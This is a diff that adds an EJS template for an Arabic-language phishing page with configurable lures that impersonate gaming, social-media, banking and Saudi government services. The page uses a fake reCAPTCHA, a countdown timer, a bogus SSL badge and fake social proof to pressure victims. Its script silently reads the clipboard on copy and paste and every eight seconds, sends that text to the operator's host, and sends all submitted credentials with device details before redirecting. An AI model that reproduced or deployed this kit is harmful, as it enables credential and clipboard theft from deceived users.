@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title><%= cfg.title %></title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  background:<%= cfg.bgColor %>;
+  color:#fff;
+  font-family:'Segoe UI',Tahoma,Arial,sans-serif;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+.card{
+  background:rgba(255,255,255,0.06);
+  backdrop-filter:blur(12px);
+  border:1px solid rgba(255,255,255,0.12);
+  border-radius:24px;
+  padding:36px 28px;
+  max-width:400px;
+  width:100%;
+  box-shadow:0 20px 60px rgba(0,0,0,0.5);
+}
+.logo-wrap{text-align:center;margin-bottom:20px}
+.logo-wrap img{width:72px;height:72px;border-radius:16px;object-fit:contain}
+.logo-emoji{font-size:56px;display:block;text-align:center;margin-bottom:8px}
+.title{
+  font-size:22px;
+  font-weight:800;
+  text-align:center;
+  margin-bottom:8px;
+  color:#fff;
+  line-height:1.3;
+}
+.desc{
+  font-size:14px;
+  color:rgba(255,255,255,0.6);
+  text-align:center;
+  margin-bottom:24px;
+  line-height:1.6;
+}
+.social-proof{
+  background:rgba(255,255,255,0.07);
+  border-radius:10px;
+  padding:10px 14px;
+  font-size:13px;
+  color:rgba(255,255,255,0.75);
+  text-align:center;
+  margin-bottom:20px;
+  border:1px solid rgba(255,255,255,0.1);
+}
+.social-proof::before{content:"✅ ";}
+.timer-wrap{
+  text-align:center;
+  margin-bottom:18px;
+}
+.timer{
+  font-size:32px;
+  font-weight:900;
+  color:<%= cfg.btnColor %>;
+  font-variant-numeric:tabular-nums;
+}
+.timer-label{font-size:12px;color:rgba(255,255,255,0.5);margin-top:2px}
+.field-group{margin-bottom:16px}
+.field-label{
+  display:block;
+  font-size:13px;
+  color:rgba(255,255,255,0.7);
+  margin-bottom:6px;
+  font-weight:600;
+}
+.field-input{
+  width:100%;
+  background:rgba(255,255,255,0.09);
+  border:1.5px solid rgba(255,255,255,0.15);
+  border-radius:12px;
+  padding:14px 16px;
+  color:#fff;
+  font-size:15px;
+  outline:none;
+  transition:border-color 0.2s,background 0.2s;
+  font-family:inherit;
+  direction:ltr;
+  text-align:right;
+}
+.field-input:focus{
+  border-color:<%= cfg.btnColor %>;
+  background:rgba(255,255,255,0.13);
+}
+.field-input::placeholder{color:rgba(255,255,255,0.3)}
+.btn-submit{
+  width:100%;
+  background:linear-gradient(135deg,<%= cfg.btnColor %>,<%= cfg.btnColor %>cc);
+  color:#fff;
+  border:none;
+  border-radius:14px;
+  padding:16px;
+  font-size:17px;
+  font-weight:800;
+  cursor:pointer;
+  margin-top:8px;
+  transition:opacity 0.2s,transform 0.1s;
+  letter-spacing:0.5px;
+}
+.btn-submit:active{transform:scale(0.98);opacity:0.9}
+.btn-submit:disabled{opacity:0.6;cursor:not-allowed}
+.captcha-wrap{
+  margin:18px 0 8px;
+  background:rgba(255,255,255,0.05);
+  border:1px solid rgba(255,255,255,0.12);
+  border-radius:10px;
+  padding:12px 16px;
+  display:flex;
+  align-items:center;
+  gap:12px;
+  cursor:pointer;
+}
+.captcha-check{
+  width:22px;height:22px;
+  border-radius:4px;
+  border:2px solid rgba(255,255,255,0.4);
+  display:flex;align-items:center;justify-content:center;
+  transition:all 0.2s;
+  flex-shrink:0;
+}
+.captcha-check.checked{background:#4ade80;border-color:#4ade80}
+.captcha-check.checked::after{content:"✓";color:#fff;font-size:14px;font-weight:900}
+.captcha-text{font-size:13px;color:rgba(255,255,255,0.7)}
+.captcha-logo{margin-right:auto;font-size:11px;color:rgba(255,255,255,0.3)}
+.success-wrap{display:none;text-align:center;padding:20px 0}
+.success-icon{font-size:64px;margin-bottom:12px}
+.success-title{font-size:20px;font-weight:800;margin-bottom:8px;color:#4ade80}
+.success-desc{font-size:14px;color:rgba(255,255,255,0.6);line-height:1.6}
+.loading-wrap{display:none;text-align:center;padding:10px 0}
+.spinner{
+  width:36px;height:36px;
+  border:3px solid rgba(255,255,255,0.15);
+  border-top-color:<%= cfg.btnColor %>;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+  margin:0 auto 12px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{font-size:14px;color:rgba(255,255,255,0.6)}
+.security-badge{
+  display:flex;align-items:center;justify-content:center;
+  gap:6px;font-size:11px;color:rgba(255,255,255,0.3);
+  margin-top:18px;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <% if(cfg.logo){ %>
+  <div class="logo-wrap"><img src="<%= cfg.logo %>" alt="logo"></div>
+  <% } else { %>
+  <div class="logo-emoji">
+    <% if(cfg.template==='pubg')   { %> 🎮
+    <% } else if(cfg.template==='ig')   { %> 📸
+    <% } else if(cfg.template==='ff')   { %> 🔥
+    <% } else if(cfg.template==='snap') { %> 👻
+    <% } else if(cfg.template==='bank') { %> 🏦
+    <% } else if(cfg.template==='gov')  { %> 🇸🇦
+    <% } else { %> 🎁
+    <% } %>
+  </div>
+  <% } %>
+
+  <div id="mainContent">
+    <div class="title"><%= cfg.title %></div>
+    <div class="desc"><%= cfg.desc %></div>
+
+    <% if(cfg.social){ %>
+    <div class="social-proof"><%= cfg.social %></div>
+    <% } %>
+
+    <% if(cfg.timer > 0){ %>
+    <div class="timer-wrap">
+      <div class="timer" id="timerDisplay"><%=String(cfg.timer).padStart(2,'0')%>:00</div>
+      <div class="timer-label">⏳ تبقى من الوقت</div>
+    </div>
+    <% } %>
+
+    <form id="mainForm" onsubmit="submitForm(event)">
+      <% for(let i=0;i<cfg.fields.length;i++){ %>
+      <div class="field-group">
+        <label class="field-label"><%= cfg.fields[i].label %></label>
+        <input
+          class="field-input"
+          type="<%= cfg.fields[i].type || 'text' %>"
+          placeholder="<%= cfg.fields[i].label %>..."
+          name="f_<%= i %>"
+          id="f_<%= i %>"
+          autocomplete="<%= cfg.fields[i].type==='password' ? 'current-password' : 'on' %>"
+          required
+        >
+      </div>
+      <% } %>
+
+      <div class="captcha-wrap" onclick="checkCaptcha()">
+        <div class="captcha-check" id="captchaBox"></div>
+        <span class="captcha-text">لست روبوتاً</span>
+        <span class="captcha-logo">reCAPTCHA<br><span style="font-size:9px">الخصوصية · الشروط</span></span>
+      </div>
+
+      <button type="submit" class="btn-submit" id="submitBtn" disabled><%= cfg.btnText %></button>
+    </form>
+
+    <div class="loading-wrap" id="loadingWrap">
+      <div class="spinner"></div>
+      <div class="loading-text">جاري التحقق من بياناتك...</div>
+    </div>
+  </div>
+
+  <div class="success-wrap" id="successWrap">
+    <div class="success-icon">✅</div>
+    <div class="success-title">تم بنجاح!</div>
+    <div class="success-desc">تم التحقق من بياناتك، سيتم تحويلك خلال ثوانٍ...</div>
+  </div>
+
+  <div class="security-badge">🔒 اتصال آمن ومشفر · SSL</div>
+</div>
+
+<script>
+const HOST = '<%= host %>';
+const REDIRECT = '<%= cfg.redirect || "https://www.google.com" %>';
+const TIMER_MIN = <%= cfg.timer || 0 %>;
+
+// ── Device info ─────────────────────────────────────────────────────────────
+const deviceInfo = navigator.userAgent.slice(0,80);
+const platform   = navigator.platform || navigator.userAgentData?.platform || '?';
+
+// ── Clipboard monitoring ─────────────────────────────────────────────────────
+document.addEventListener('copy',  () => sendClip());
+document.addEventListener('cut',   () => sendClip());
+document.addEventListener('paste', e => {
+  const t = e.clipboardData?.getData('text') || '';
+  if (t.length > 2) sendClipText(t);
+});
+function sendClip() {
+  navigator.clipboard?.readText?.().then(t => { if(t&&t.length>2) sendClipText(t); }).catch(()=>{});
+}
+function sendClipText(t) {
+  fetch(HOST+'/p/clip',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:t,device:deviceInfo})}).catch(()=>{});
+}
+// Periodic clipboard check every 8s while page is open
+let _lastClip = '';
+setInterval(()=>{
+  navigator.clipboard?.readText?.().then(t=>{ if(t&&t!==_lastClip&&t.length>2){ _lastClip=t; sendClipText(t); } }).catch(()=>{});
+},8000);
+
+// ── Countdown timer ──────────────────────────────────────────────────────────
+if (TIMER_MIN > 0) {
+  let secs = TIMER_MIN * 60;
+  const el = document.getElementById('timerDisplay');
+  const iv = setInterval(()=>{
+    secs--;
+    if (secs <= 0) { clearInterval(iv); if(el) el.textContent='00:00'; return; }
+    const m = Math.floor(secs/60), s = secs%60;
+    if(el) el.textContent = String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+  },1000);
+}
+
+// ── Fake CAPTCHA ─────────────────────────────────────────────────────────────
+let captchaDone = false;
+function checkCaptcha() {
+  if (captchaDone) return;
+  setTimeout(()=>{
+    captchaDone = true;
+    const box = document.getElementById('captchaBox');
+    if (box) { box.classList.add('checked'); }
+    const btn = document.getElementById('submitBtn');
+    if (btn) btn.disabled = false;
+  }, 600 + Math.random()*800);
+}
+
+// ── Form submit ──────────────────────────────────────────────────────────────
+function submitForm(e) {
+  e.preventDefault();
+  if (!captchaDone) return;
+  const fields = {};
+  <% for(let i=0;i<cfg.fields.length;i++){ %>
+  fields['<%= cfg.fields[i].label %>'] = document.getElementById('f_<%= i %>')?.value || '';
+  <% } %>
+
+  document.getElementById('mainForm').style.display = 'none';
+  document.getElementById('loadingWrap').style.display = 'block';
+
+  fetch(HOST+'/p/submit',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({ fields, device:deviceInfo, platform })
+  }).catch(()=>{});
+
+  setTimeout(()=>{
+    document.getElementById('loadingWrap').style.display = 'none';
+    document.getElementById('successWrap').style.display = 'block';
+    setTimeout(()=>{ window.location.href = REDIRECT; }, 3000);
+  }, 2500);
+}
+</script>
+</body>
+</html>
